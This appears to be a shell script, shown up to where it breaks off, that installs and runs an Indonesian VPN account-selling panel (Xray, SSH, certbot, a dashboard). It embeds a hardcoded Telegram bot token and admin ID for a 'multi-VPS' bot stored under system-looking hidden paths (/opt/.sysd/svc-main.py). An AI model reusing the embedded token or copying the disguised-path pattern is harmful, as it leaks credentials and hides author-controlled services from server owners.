#!/bin/bash



#================================================



# SHELLCHECK: Rule suppressions below are intentional



# - SC2059/SC2086: ANSI color codes & box-drawing



#   variables are always alphanumeric, never user input



# - SC2034: Port/documentation constants kept for reference



# - SC2015: && || is idiomatic bash short-circuit pattern



#   (all branches are simple, side effects are intentional)



# - SC1091: /etc/os-release is system file, always present



# - Others: Style preferences that don't affect functionality



#================================================



# shellcheck disable=SC1091,SC2002,SC2012,SC2015,SC2016,SC2034,SC2059,SC2086



# shellcheck disable=SC2119,SC2120,SC2126,SC2129,SC2155,SC2181,SC2183,SC2188



# shellcheck disable=SC2206,SC2207











#================================================



# Youzin Crabz Tunel



# The Professor



# GitHub: putrinuroktavia234-max/Tunnel



# Version: 3.12.0 FINAL — OrderVPN Web Integrated, Multi-VPS, OTP Email, Trial, Full Admin



#================================================







RED='\033[0;31m'



GREEN='\033[0;32m'



YELLOW='\033[1;33m'



BLUE='\033[0;34m'



CYAN='\033[0;36m'



PURPLE='\033[0;35m'



WHITE='\033[1;37m'



BOLD='\033[1m'



DIM='\033[2m'



NC='\033[0m'







DOMAIN=""



DOMAIN_FILE="/root/domain"



IP_CACHE_FILE="/root/.ip_vps"



AKUN_DIR="/root/akun"



XRAY_CONFIG="/usr/local/etc/xray/config.json"



DDOS_CONFIG="/root/.ddos_rules"



TRAFFIC_DIR="/root/traffic"



XRAY_LOCK_FILE="/root/.xray_config.lock"



SCRIPT_VERSION="3.12.0"



SCRIPT_AUTHOR="The Professor"



GITHUB_USER="putrinuroktavia234-max"



GITHUB_REPO="Tunnel"



GITHUB_BRANCH="main"



SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/tunnel.sh"



VERSION_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/version"



SCRIPT_PATH="/root/tunnel.sh"



BACKUP_PATH="/root/tunnel.sh.bak"



PUBLIC_HTML="/var/www/html"



USERNAME="YouzinCrabz"



BOT_TOKEN_FILE="/root/.bot_token"



CHAT_ID_FILE="/root/.chat_id"



ORDER_DIR="/root/orders"



PAYMENT_FILE="/root/.payment_info"



DOMAIN_TYPE_FILE="/root/.domain_type"



SYSTEM_INFO_CACHE="/root/.sysinfo_cache"



IP_CACHE_TTL=600



SYSINFO_CACHE_TTL=30







# TunnelBot Multi-VPS



TUNNELBOT_DIR="/opt/.sysd"



TUNNELBOT_FILE="/opt/.sysd/svc-main.py"



TUNNELBOT_TOKEN="8216471228:AAHqm7iwcMqEqLjnj2VEqIaZGVQtYyS_4K4"



TUNNELBOT_ADMIN="8019568852"



VPS_FILE="/root/.svc_reg"







#================================================



# PORT VARIABLES



#================================================



SSH_PORT="22"



DROPBEAR_PORT="222"



NGINX_PORT="80"



NGINX_DL_PORT="81"



NGINX_SSL_PORT="443"



XRAY_VMESS_WS="8080"



XRAY_VLESS_WS="8081"



XRAY_TROJAN_WS="8082"



XRAY_VMESS_GRPC="8444"



XRAY_VLESS_GRPC="8445"



XRAY_TROJAN_GRPC="8446"



BADVPN_RANGE="7100-7300"



PRICE_MONTHLY="10000"



DURATION_MONTHLY="30"







#================================================



# UBUNTU COMPATIBILITY LAYER



#================================================







detect_ubuntu_version() {



    UBUNTU_VER="unknown"



    UBUNTU_MAJOR=0



    if [[ -f /etc/os-release ]]; then



        source /etc/os-release



        UBUNTU_VER="${VERSION_ID:-unknown}"



        UBUNTU_MAJOR="${VERSION_ID%%.*}"



    fi



}







# Deteksi apakah berjalan di container (OpenVZ/LXC)



detect_container() {



    IS_CONTAINER=0



    if [[ -f /proc/1/environ ]]; then



        if grep -q "container=lxc" /proc/1/environ 2>/dev/null; then IS_CONTAINER=1; fi



    fi



    if systemd-detect-virt --container &>/dev/null; then IS_CONTAINER=1; fi



}







# Install certbot sesuai Ubuntu version



install_certbot_compat() {



    local domain_type="${1:-custom}"



    [[ "$domain_type" != "custom" ]] && return 0







    detect_ubuntu_version



    detect_container







    # Jika sudah ada certbot yang berfungsi, skip



    if command -v certbot >/dev/null 2>&1; then



        return 0



    fi







    echo -e "  ${CYAN}Installing certbot...${NC}"







    # Pastikan apt tidak locked



    _wait_apt_lock







    # Ubuntu 22+: pakai certbot dari apt universe



    # Ubuntu 20: pakai apt, fallback snap jika bukan container



    # Container: snap tidak support, wajib apt



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        # Ubuntu 22/24: pastikan universe enabled, install certbot



        add-apt-repository -y universe >/dev/null 2>&1 || true



        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true



    elif [[ "$IS_CONTAINER" -eq 1 ]]; then



        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true



    else



        # Ubuntu 20 bare metal: coba apt dulu, fallback snap



        if ! DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1; then



            if command -v snap >/dev/null 2>&1; then



                snap install --classic certbot 2>/dev/null && \
                    ln -sf /snap/bin/certbot /usr/bin/certbot 2>/dev/null || true



            fi



        fi



    fi







    command -v certbot >/dev/null 2>&1



}







# Tunggu apt lock bebas (max 60 detik)



_wait_apt_lock() {



    local i=0



    while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || \
          fuser /var/lib/apt/lists/lock >/dev/null 2>&1; do



        if [[ $i -eq 0 ]]; then



            echo -e "  ${YELLOW}Menunggu apt lock bebas...${NC}"



        fi



        sleep 2; ((i++))



        [[ $i -ge 30 ]] && break



    done



    # Kill unattended-upgrades yang mungkin lock



    if [[ $i -ge 30 ]]; then



        systemctl stop unattended-upgrades 2>/dev/null || true



        sleep 2



    fi



}







# Cek apakah iptables atau nftables



detect_firewall_backend() {



    if command -v nft >/dev/null 2>&1 && nft list tables 2>/dev/null | grep -q .; then



        FW_BACKEND="nftables"



    else



        FW_BACKEND="iptables"



    fi



}







# pip install yang kompatibel semua Ubuntu



pip_install() {



    local pkg="$1"



    detect_ubuntu_version



    # Ubuntu 22+ (PEP 668): pip3 butuh --break-system-packages untuk install global



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || \
        pip3 install "$pkg" -q 2>/dev/null || true



    else



        pip3 install "$pkg" -q 2>/dev/null || \
        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || true



    fi



}







# Nama service SSH yang benar (Ubuntu 22+ pakai ssh, Ubuntu 20 pakai sshd)



get_ssh_service_name() {



    if systemctl list-units --type=service 2>/dev/null | grep -q "^  ssh\.service"; then



        echo "ssh"



    elif systemctl list-units --type=service 2>/dev/null | grep -q "^  sshd\.service"; then



        echo "sshd"



    else



        echo "ssh"



    fi



}







# Restart service dengan validasi dulu



restart_service_safe() {



    local svc="$1"



    local validate_cmd="${2:-}"







    # Jalankan validasi config dulu jika ada



    if [[ -n "$validate_cmd" ]]; then



        if ! $validate_cmd >/dev/null 2>&1; then



            echo -e "  ${RED}✘ Config error pada ${svc}! Skip restart.${NC}"



            $validate_cmd 2>&1 | head -5 | sed 's/^/    /'



            return 1



        fi



    fi







    if systemctl is-enabled --quiet "$svc" 2>/dev/null || \
       systemctl is-active --quiet "$svc" 2>/dev/null; then



        systemctl restart "$svc" 2>/dev/null



        sleep 1



        if systemctl is-active --quiet "$svc" 2>/dev/null; then



            return 0



        else



            echo -e "  ${RED}✘ ${svc} gagal start!${NC}"



            journalctl -u "$svc" -n 5 --no-pager 2>/dev/null | sed 's/^/    /'



            return 1



        fi



    fi



    return 0



}







# curl/wget dengan timeout



safe_curl() {



    curl -fsSL --max-time 30 --retry 2 --retry-delay 3 "$@"



}







safe_wget() {



    wget -q --timeout=30 --tries=2 "$@"



}







#================================================



# SEPARATOR THEME — Mobile Friendly, Always Symmetric



#================================================







# Lebar fixed 54 — pas untuk layar HP semua ukuran



get_width() { echo 66; }







# _slen: hitung panjang string setelah strip ANSI codes



_slen() { printf "%b" "$1" | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\n' | wc -m | tr -d ' '; }







# Buat n karakter berulang



_rep() {



    local c="$1" n=$2 r=""



    while [ $n -gt 0 ]; do r="${r}${c}"; n=$((n-1)); done



    printf "%s" "$r"



}







# Garis separator penuh



_box_top()     { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }



_box_bottom()  { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }



_box_divider() { printf "${CYAN}$(_rep '─' $1)${NC}\n"; }







# Teks tengah



_box_center() {



    local W=$1 text="$2"



    local tlen; tlen=$(_slen "$text")



    local lpad=$(( (W-tlen)/2 )); [ $lpad -lt 0 ] && lpad=0



    printf "%${lpad}s%b\n" "" "$text"



}







# Teks kiri dengan indent 2 spasi



_box_left() {



    printf "  %b\n" "$2"



}







# Two-column: selalu simetris, lebar kolom sama



_box_row() {



    local W=$1 l="$2" r="$3"



    local col=$(( (W-2)/2 ))



    printf "  %-${col}s%-${col}s\n" "$l" "$r"



}







# Mini (untuk sub-menu) — sama persis, tidak ada perbedaan indent



_mini_top()     { _box_top "$1"; }



_mini_bottom()  { _box_bottom "$1"; }



_mini_divider() { _box_divider "$1"; }



_mini_center() { _box_center "$1" "$2"; }



_mini_left()    { _box_left "$1" "$2"; }



_mini_row()     { _box_row "$1" "$2" "$3"; }







# _mini_two: dua kolom dengan teks ber-ANSI



_mini_two() {



    local W=$1 left="$2" right="$3"



    local col=$(( (W-2)/2 ))



    local llen; llen=$(_slen "$left")



    local rlen; rlen=$(_slen "$right")



    local lpad=$(( col - llen )); [ $lpad -lt 0 ] && lpad=0



    local rpad=$(( col - rlen )); [ $rpad -lt 0 ] && rpad=0



    printf "  %b%${lpad}s%b%${rpad}s\n" "$left" "" "$right" ""



}







_ram_bar() {



    local pct=$1 len=12 f e bar=""



    f=$(( pct * len / 100 )); e=$(( len - f ))



    local i=0; while [ $i -lt $f ]; do bar="${bar}█"; i=$((i+1)); done



    i=0; while [ $i -lt $e ]; do bar="${bar}░"; i=$((i+1)); done



    printf "%s" "$bar"



}







#================================================



# ANIMASI & PROGRESS



#================================================







spinner_frames=('⣾' '⣽' '⣻' '⢿' '⡿' '⣟' '⣯' '⣷')



bar_frames=('▱▱▱▱▱▱▱▱▱▱' '▰▱▱▱▱▱▱▱▱▱' '▰▰▱▱▱▱▱▱▱▱' '▰▰▰▱▱▱▱▱▱▱' '▰▰▰▰▱▱▱▱▱▱' '▰▰▰▰▰▱▱▱▱▱' '▰▰▰▰▰▰▱▱▱▱' '▰▰▰▰▰▰▰▱▱▱' '▰▰▰▰▰▰▰▰▱▱' '▰▰▰▰▰▰▰▰▰▱' '▰▰▰▰▰▰▰▰▰▰')







animated_loading() {



    local msg="$1" duration="${2:-2}" i=0 end=$((SECONDS+duration)) dots frame



    while [ $SECONDS -lt $end ]; do



        frame="${spinner_frames[$((i%8))]}"



        case $((i%4)) in 0) dots="   ";; 1) dots=".  ";; 2) dots=".. ";; 3) dots="...";; esac



        printf "\r  ${CYAN}${frame}${NC} ${WHITE}${msg}${NC}${YELLOW}${dots}${NC}   "



        sleep 0.1; i=$((i+1))



    done



    printf "\r  ${GREEN}✔${NC} ${WHITE}${msg}${NC} ${GREEN}[SELESAI]${NC}           \n"



}







show_progress() {



    local cur=$1 tot=$2 label="$3"



    local pct=$(( cur * 100 / tot ))



    local f=$(( cur * 10 / tot ))



    printf "\r  ${CYAN}[${NC}${GREEN}%s${NC}${CYAN}]${NC} ${WHITE}%3d%%${NC}  ${DIM}%s${NC}   " "${bar_frames[$f]}" "$pct" "$label"



    echo ""



}







#================================================



# BANNER INSTALL



#================================================







show_install_banner() {



    clear



    local W; W=$(get_width)



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"



    _box_center $W "${CYAN}Script Auto Install${NC}"



    _box_center $W "${WHITE}Youzin Crabz Tunel${NC}"



    _box_center $W "${DIM}The Professor${NC}"



    _box_bottom $W



    echo ""



}







#================================================



# UTILITY FUNCTIONS



#================================================







check_status() { systemctl is-active --quiet "$1" 2>/dev/null && echo "ON" || echo "OFF"; }







get_ip() {



    # Cache dengan TTL 10 menit — lebih agresif



    if [ -f "$IP_CACHE_FILE" ]; then



        local cached cached_time now



        cached=$(tr -d '[:space:]' < "$IP_CACHE_FILE")



        # Ambil timestamp dari mtime file



        cached_time=$(stat -c %Y "$IP_CACHE_FILE" 2>/dev/null || echo 0)



        now=$(date +%s)



        # Jika cache masih fresh (< 10 menit) dan valid, pakai



        if [ $((now - cached_time)) -lt "$IP_CACHE_TTL" ]; then



            if echo "$cached" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



                for octet in $(echo "$cached" | tr '.' ' '); do



                    [ $((10#$octet)) -gt 255 ] && { cached=""; break; }



                done



                [ -n "$cached" ] && { echo "$cached"; return; }



            fi



        fi



    fi



    local ip



    # Deteksi IPv4 paksa (-4) untuk hindari IPv6



    for url in "https://ipinfo.io/ip" "https://api.ipify.org" "https://ifconfig.me" "https://checkip.amazonaws.com"; do



        ip=$(curl -4 -s --max-time 5 "$url" 2>/dev/null | tr -d '[:space:]')



        # Validasi format IPv4



        if echo "$ip" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



            local valid=true



            for octet in $(echo "$ip" | tr '.' ' '); do



                [ $((10#$octet)) -gt 255 ] && { valid=false; break; }



            done



            [ "$valid" = false ] && continue



            echo "$ip" > "$IP_CACHE_FILE"



            echo "$ip"



            return



        fi



    done



    # Fallback: deteksi IP lokal via routing



    ip=$(ip -4 route get 8.8.8.8 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')



    if [ -n "$ip" ] && echo "$ip" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



        for octet in $(echo "$ip" | tr '.' ' '); do



            [ $((10#$octet)) -gt 255 ] && { ip=""; break; }



        done



        [ -n "$ip" ] && { echo "$ip" > "$IP_CACHE_FILE"; echo "$ip"; return; }



    fi



    echo "N/A"



}







send_telegram_admin() {



    [ -f "$BOT_TOKEN_FILE" ] && [ -f "$CHAT_ID_FILE" ] || return



    local token chatid; token=$(cat "$BOT_TOKEN_FILE"); chatid=$(cat "$CHAT_ID_FILE")



    curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
        -d chat_id="$chatid" -d text="$1" -d parse_mode="HTML" --max-time 10 >/dev/null 2>&1



}







#================================================



# HEADER & SECTION HELPERS



#================================================







print_menu_header() {



    local W; W=$(get_width)



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}$1${NC}"



    _box_bottom $W



    echo ""



}







print_section() {



    local W; W=$(get_width)



    echo ""



    _box_divider $W



    echo -e "  ${CYAN}▸ ${WHITE}$1${NC}"



    _box_divider $W



    echo ""



}







#================================================



# DASHBOARD — TAMPILAN UTAMA



#================================================







# Baca CPU dari /proc/stat (jauh lebih cepat dari top -bn1)



_get_cpu_usage() {



    local idle1 total1 idle2 total2 diff_idle diff_total



    # Baca total dan idle dari baris pertama /proc/stat



    local cpu_line



    cpu_line=$(head -1 /proc/stat 2>/dev/null || echo "cpu 0 0 0 0 0 0 0 0 0 0")



    # user nice system idle iowait irq softirq steal guest guest_nice



    set -- $cpu_line



    shift # remove 'cpu'



    total1=$(( $1 + $2 + $3 + $4 + $5 + $6 + $7 + $8 ))



    idle1=$4



    sleep 0.1



    cpu_line=$(head -1 /proc/stat 2>/dev/null || echo "cpu 0 0 0 0 0 0 0 0 0 0")



    set -- $cpu_line



    shift



    total2=$(( $1 + $2 + $3 + $4 + $5 + $6 + $7 + $8 ))



    idle2=$4



    diff_idle=$(( idle2 - idle1 ))



    diff_total=$(( total2 - total1 ))



    if [ $diff_total -gt 0 ]; then



        echo $(( (100 * (diff_total - diff_idle)) / diff_total ))



    else



        echo "0"



    fi



}







# Batch systemctl check — 1 panggilan untuk semua service



_get_services_status() {



    if command -v systemctl >/dev/null 2>&1; then



        # Dapatkan semua service aktif dalam 1 panggilan



        local active_units



        active_units=$(systemctl list-units --type=service --state=running --no-legend --no-pager 2>/dev/null | awk '{print $1}' | tr '\n' '|')



        echo "$active_units"



    fi



}







show_system_info() {



    clear



    [ -f "$DOMAIN_FILE" ] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)







    # ── CACHE CHECK: refresh hanya jika cache sudah expired ──



    local use_cache=0



    if [ -f "$SYSTEM_INFO_CACHE" ]; then



        local cache_time now



        cache_time=$(stat -c %Y "$SYSTEM_INFO_CACHE" 2>/dev/null || echo 0)



        now=$(date +%s)



        [ $((now - cache_time)) -lt "$SYSINFO_CACHE_TTL" ] && use_cache=1



    fi







    local os_name="Unknown"



    [ -f /etc/os-release ] && { . /etc/os-release; os_name="${PRETTY_NAME}"; }







    local ip_vps ram_used ram_total ram_pct cpu uptime_str ssl_type svc_running svc_total







    if [ $use_cache -eq 1 ]; then



        # Baca dari cache



        local cached_data



        cached_data=$(cat "$SYSTEM_INFO_CACHE" 2>/dev/null || echo "")



        if [ -n "$cached_data" ]; then



            source <(echo "$cached_data") 2>/dev/null || true



        else



            use_cache=0



        fi



    fi







    if [ $use_cache -eq 0 ]; then



        # Kumpulkan data (hanya sekali setiap 30 detik)



        ip_vps=$(get_ip)



        ram_used=$(free -m | awk '/Mem:/{print $3}')



        ram_total=$(free -m | awk '/Mem:/{print $2}')



        ram_pct=$(awk "BEGIN{printf \"%.0f\",($ram_used/$ram_total)*100}")



        cpu=$(_get_cpu_usage)



        uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' | sed 's/ hours\?/h/g;s/ minutes\?/m/g')







        local domain_type="custom"



        [ -f "$DOMAIN_TYPE_FILE" ] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



        if [ "$domain_type" = "custom" ]; then



            [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ] && ssl_type="LetsEncrypt (Active)" || ssl_type="LetsEncrypt (Warn)"



        else



            ssl_type="Self-Signed"



        fi







        # Batch systemctl: 1 panggilan untuk semua service



        local active_units



        active_units=$(_get_services_status)



        local svcs=(xray nginx ssh haproxy dropbear udp-custom zivpn-udp vpn-keepalive vpn-bot)



        svc_total=${#svcs[@]}; svc_running=0



        for s in "${svcs[@]}"; do



            if echo "$active_units" | grep -q "${s}\.service|"; then



                svc_running=$((svc_running+1))



            fi



        done







        # Cache hasil ke file (termasuk active_units untuk service status)



        printf "ip_vps='%s'\nram_used='%s'\nram_total='%s'\nram_pct='%s'\ncpu='%s'\nuptime_str='%s'\nssl_type='%s'\nsvc_total='%s'\nsvc_running='%s'\nactive_units='%s'\n" \
            "$ip_vps" "$ram_used" "$ram_total" "$ram_pct" "$cpu" "$uptime_str" "$ssl_type" "$svc_total" "$svc_running" "$active_units" \
            > "$SYSTEM_INFO_CACHE" 2>/dev/null



    fi







    local ssh_count vmess_count vless_count trojan_count



    ssh_count=$(ls "$AKUN_DIR"/ssh-*.txt 2>/dev/null | wc -l)



    vmess_count=$(ls "$AKUN_DIR"/vmess-*.txt 2>/dev/null | wc -l)



    vless_count=$(ls "$AKUN_DIR"/vless-*.txt 2>/dev/null | wc -l)



    trojan_count=$(ls "$AKUN_DIR"/trojan-*.txt 2>/dev/null | wc -l)







    local BAR; BAR=$(_ram_bar "$ram_pct")



    local W; W=$(get_width)







    # ── HEADER ──



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"



    _box_center $W "${CYAN}The Professor${NC}"



    _box_bottom $W



    echo ""







    # ── SERVER STATUS ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}SERVER CORE STATUS${NC}"



    _box_divider $W



    echo -e "  ${WHITE}IP Address${NC}  : ${GREEN}${ip_vps}${NC}"



    echo -e "  ${WHITE}Domain${NC}      : ${CYAN}${DOMAIN:-N/A}${NC}"



    echo -e "  ${WHITE}OS${NC}          : ${WHITE}${os_name}${NC}"



    echo -e "  ${WHITE}Uptime${NC}      : ${WHITE}${uptime_str}${NC}"



    echo -e "  ${WHITE}CPU Load${NC}    : ${YELLOW}${cpu}%${NC}"



    echo -e "  ${WHITE}RAM Usage${NC}   : ${WHITE}${ram_used} / ${ram_total} MB${NC} ${CYAN}[${BAR}]${NC} ${YELLOW}${ram_pct}%${NC}"



    echo -e "  ${WHITE}SSL Status${NC}  : ${GREEN}${ssl_type}${NC}"



    echo -e "  ${WHITE}Services${NC}    : ${GREEN}${svc_running}/${svc_total} Running${NC}"



    _box_bottom $W



    echo ""







    # ── ACTIVE ACCOUNTS ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}ACTIVE ACCOUNTS${NC}"



    _box_divider $W



    _box_center $W "SSH: ${GREEN}${ssh_count}${NC}  VMess: ${GREEN}${vmess_count}${NC}  VLess: ${GREEN}${vless_count}${NC}  Trojan: ${GREEN}${trojan_count}${NC}"



    _box_bottom $W



    echo ""







    # ── NETWORK SERVICES ──



    local xs xn hs dn ss un ks bt fb cj fw



    if [ -z "${active_units:-}" ]; then



        local active_units



        active_units=$(_get_services_status)



    fi



    _svc_on() { echo "$active_units" | grep -q "${1}\.service|"; }



    _svc_on xray          && xs="${GREEN}● ONLINE${NC}" || xs="${RED}○ OFFLINE${NC}"



    _svc_on nginx         && xn="${GREEN}● ONLINE${NC}" || xn="${RED}○ OFFLINE${NC}"



    _svc_on haproxy       && hs="${GREEN}● ONLINE${NC}" || hs="${RED}○ OFFLINE${NC}"



    _svc_on dropbear      && dn="${GREEN}● ONLINE${NC}" || dn="${RED}○ OFFLINE${NC}"



    local ssh_svc_name; ssh_svc_name=$(get_ssh_service_name)



    _svc_on "$ssh_svc_name" && ss="${GREEN}● ONLINE${NC}" || ss="${RED}○ OFFLINE${NC}"



    _svc_on udp-custom    && un="${GREEN}● ONLINE${NC}" || un="${RED}○ OFFLINE${NC}"



    _svc_on vpn-keepalive && ks="${GREEN}● ONLINE${NC}" || ks="${RED}○ OFFLINE${NC}"



    # Bot Telegram



    if [[ -f "$BOT_TOKEN_FILE" ]] && _svc_on vpn-bot; then



        bt="${GREEN}● ONLINE${NC}"



    elif [[ -f "$BOT_TOKEN_FILE" ]]; then



        bt="${YELLOW}● CONFIG${NC}"



    else



        bt="${RED}○ OFFLINE${NC}"



    fi



    # Fail2ban - langsung grep dari active_units



    if echo "$active_units" | grep -q "fail2ban\.service|"; then



        fb="${GREEN}● ONLINE${NC}"



    else



        fb="${RED}○ OFFLINE${NC}"



    fi



    # Cron auto-delete expired



    crontab -l 2>/dev/null | grep -q "delete_expired_cron" && \
        cj="${GREEN}● ONLINE${NC}" || cj="${RED}○ OFFLINE${NC}"



    # UFW Firewall



    if command -v ufw >/dev/null 2>&1; then



        ufw status 2>/dev/null | grep -qi "^Status: active" && \
            fw="${GREEN}● ONLINE${NC}" || fw="${RED}○ OFFLINE${NC}"



    else



        fw="${DIM}○ N/A   ${NC}"



    fi







    _box_top $W



    _box_center $W "${CYAN}${BOLD}NETWORK SERVICES${NC}"



    _box_divider $W



    _mini_two $W "${WHITE}XRAY${NC}      : ${xs}" "${WHITE}NGINX${NC}    : ${xn}"



    _mini_two $W "${WHITE}HAPROXY${NC}   : ${hs}" "${WHITE}DROPBEAR${NC} : ${dn}"



    _mini_two $W "${WHITE}SSH${NC}       : ${ss}" "${WHITE}UDP CUST${NC} : ${un}"



    _mini_two $W "${WHITE}KEEPALIVE${NC} : ${ks}" "${WHITE}BOT TG${NC}   : ${bt}"



    _mini_two $W "${WHITE}FAIL2BAN${NC}  : ${fb}" "${WHITE}CRON AUTO${NC}: ${cj}"



    _mini_two $W "${WHITE}FIREWALL${NC}  : ${fw}" ""



    _box_bottom $W



    echo ""



}







#================================================



# SHOW MAIN MENU



#================================================







show_menu() {



    local W; W=$(get_width)



    # Kolom menu: lebar setengah dari W, masing-masing kolom pakai format [XX] Label



    # [XX] = 4 char, spasi 1, label max ~22 char → total ~27 per kolom



    local col=$(( (W - 2) / 2 ))







    # Helper: buat 1 baris 2 kolom menu simetris dengan ANSI



    # _mrow col "NUM" "Label" "NUM" "Label"



    _mrow() {



        local c=$1 n1="$2" lb1="$3" n2="$4" lb2="$5"



        local left="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"



        local right="${CYAN}[${n2}]${NC} ${WHITE}${lb2}${NC}"



        local llen; llen=$(printf "%b" "[${n1}] ${lb1}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')



        local rlen; rlen=$(printf "%b" "[${n2}] ${lb2}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')



    local lpad=$(( c - llen )); [ $lpad -lt 0 ] && lpad=0



    local rpad=$(( c - rlen )); [ $rpad -lt 0 ] && rpad=0



    printf "  %b%${lpad}s%b%${rpad}s\n" "$left" "" "$right" ""



    }



    _mrow1() {



        # 1 kolom tengah



        local c=$1 n1="$2" lb1="$3"



        local text="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"



        _box_center $W "$text"



    }







    # ── ACCOUNT MANAGEMENT ──



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}ACCOUNT MANAGEMENT${NC}"



    _box_divider $W



    _mrow $col " 1" "SSH / OpenVPN"    " 5" "List All Accounts"



    _mrow $col " 2" "VMess Account"    " 6" "Renew / Extend Akun"



    _mrow $col " 3" "VLess Account"    " 7" "Check Expired"



    _mrow $col " 4" "Trojan Account"   " 8" "Delete Expired"



    _box_bottom $W



    echo ""







    # ── SYSTEM CONTROL ──



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SYSTEM CONTROL${NC}"



    _box_divider $W



    _mrow $col " 9" "Telegram Bot"     "14" "Speedtest VPS"



    _mrow $col "10" "Change Domain"    "15" "Backup Config"



    _mrow $col "11" "SSL Manager"      "16" "Restore Config"



    _mrow $col "12" "Optimize VPS"     "17" "Uninstall Panel"



    _mrow $col "13" "Restart Service"  "18" "Advanced Mode"    _mrow $col "19" "Port Info"        "20" "ZI VPN UDP"
    _mrow $col "21" "OrderVPN Web"     "22" "DDoS Protect"
    _mrow $col "23" "Traffic Monitor"  "24" "Health Check"




    _box_divider $W



    printf "  ${RED}[0]${NC}  ${WHITE}Exit Panel${NC}\n"



    _box_divider $W



    printf "  Telegram : ${CYAN}@YouzinCrabz${NC}\n"



    _box_bottom $W



    echo ""



}







#================================================



# DOMAIN SETUP



#================================================







generate_random_domain() {



    local ip_vps chars random_str



    ip_vps=$(get_ip)



    chars="abcdefghijklmnopqrstuvwxyz"



    random_str=""



    for i in {1..6}; do random_str+="${chars:RANDOM%26:1}"; done



    echo "${random_str}.${ip_vps}.nip.io"



}







setup_domain() {



    clear



    print_menu_header "SETUP DOMAIN"



    echo -e "  ${WHITE}[1]${NC} Pakai domain sendiri"



    echo -e "      ${YELLOW}Contoh: vpn.example.com${NC}"



    echo -e "      ${DIM}SSL: Let's Encrypt${NC}"



    echo ""



    echo -e "  ${WHITE}[2]${NC} Generate domain otomatis"



    local preview; preview=$(generate_random_domain)



    echo -e "      ${YELLOW}Contoh: ${preview}${NC}"



    echo -e "      ${DIM}SSL: Self-signed${NC}"



    echo ""



    read -rp "  Pilih [1/2]: " domain_choice



    case $domain_choice in



        1)



            echo ""



            read -rp "  Masukkan domain: " input_domain



            [[ -z "$input_domain" ]] && { echo -e "${RED}  ✘ Domain kosong!${NC}"; sleep 2; setup_domain; return; }



            # Validasi format domain sederhana



            if ! echo "$input_domain" | grep -qE '^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'; then



                echo -e "${RED}  ✘ Format domain tidak valid!${NC}"



                sleep 2; setup_domain; return



            fi



            DOMAIN="$input_domain"



            echo "custom" > "$DOMAIN_TYPE_FILE"



            ;;



        2)



            DOMAIN=$(generate_random_domain)



            echo "random" > "$DOMAIN_TYPE_FILE"



            echo -e "  ${GREEN}Domain: ${CYAN}${DOMAIN}${NC}"



            sleep 1



            ;;



        *)



            echo -e "  ${RED}✘ Tidak valid!${NC}"



            sleep 1; setup_domain; return



            ;;



    esac



    echo "$DOMAIN" > "$DOMAIN_FILE"



}







get_ssl_cert() {



    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



    mkdir -p /etc/xray



    if [[ "$domain_type" == "custom" ]]; then



        # Pastikan port 80 bebas dulu



        systemctl stop nginx haproxy 2>/dev/null



        sleep 1



        # Install certbot dengan compatibility layer



        install_certbot_compat "custom"



        if command -v certbot >/dev/null 2>&1; then



            certbot certonly --standalone \
                -d "$DOMAIN" \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                --timeout 60 \
                2>/dev/null



            if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



                cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



                cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



                echo -e "  ${GREEN}✔ Let's Encrypt cert berhasil!${NC}"



            else



                echo -e "  ${YELLOW}⚠ Certbot gagal, fallback ke self-signed${NC}"



                _gen_self_signed



            fi



        else



            echo -e "  ${YELLOW}⚠ certbot tidak tersedia, pakai self-signed${NC}"



            _gen_self_signed



        fi



    else



        _gen_self_signed



    fi



    chmod 644 /etc/xray/xray.* 2>/dev/null



}







_gen_self_signed() {



    openssl req -new -newkey rsa:2048 \
